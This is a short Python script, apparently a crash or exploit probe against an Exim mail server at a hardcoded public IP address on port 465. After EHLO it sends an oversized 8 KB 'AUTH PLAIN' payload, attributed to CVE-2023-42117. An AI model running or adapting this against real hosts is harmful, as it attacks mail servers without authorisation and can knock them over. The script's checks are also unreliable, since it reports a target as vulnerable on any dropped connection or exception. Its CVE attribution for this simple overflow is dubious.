import socket
import ssl

target = "37.97.145.109"
port = 465

def trigger_exim_logic():
    print(f"[*] Testing Exim 4.96 Authenticator OOB Write...")
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    try:
        with socket.create_connection((target, port), timeout=7) as sock:
            with context.wrap_socket(sock, server_hostname=target) as ssock:
                ssock.recv(1024)
                ssock.sendall(b"EHLO CyberOps.com\r\n")
                ssock.recv(1024)
                # CVE-2023-42117 logic: sending extremely large AUTH data
                print("[*] Sending 8KB Overflow Payload...")
                payload = b"AUTH PLAIN " + b"A" * 8192 + b"\r\n"
                ssock.sendall(payload)
                
                response = ssock.recv(1024)
                if not response:
                    print("[!!!] VULNERABLE: Server closed connection immediately (Possible Crash/Overflow).")
                else:
                    print(f"[-] Server Responded: {response.decode().strip()}")
    except Exception as e:
        print(f"[!] Target is likely vulnerable or filtered: {e}")

trigger_exim_logic()
